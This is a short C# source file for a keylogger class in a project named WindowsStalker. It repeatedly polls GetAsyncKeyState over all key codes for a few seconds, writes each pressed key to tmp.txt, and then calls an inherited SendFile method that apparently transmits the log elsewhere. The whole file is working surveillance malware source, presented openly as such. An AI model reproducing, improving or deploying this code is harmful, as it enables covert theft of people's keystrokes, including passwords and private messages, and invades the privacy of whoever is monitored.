using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using WindowsStalker.Properties;

namespace WindowsStalker
{
    public class Keylogger : FileCapture
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static int loggerTimeUp = 5;

        public static void LogKeys()
        {
            Stopwatch s = new Stopwatch();
            s.Start();
            StreamWriter sr = new StreamWriter("tmp.txt");

            while (s.Elapsed < TimeSpan.FromSeconds(loggerTimeUp))
            {
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 1 && keyState != -32767) continue;
                    sr.Write((Keys)i + " ");
                    break;
                }
            }

            sr.Close();
            s.Stop();

            SendFile("xd");
        }
    }
}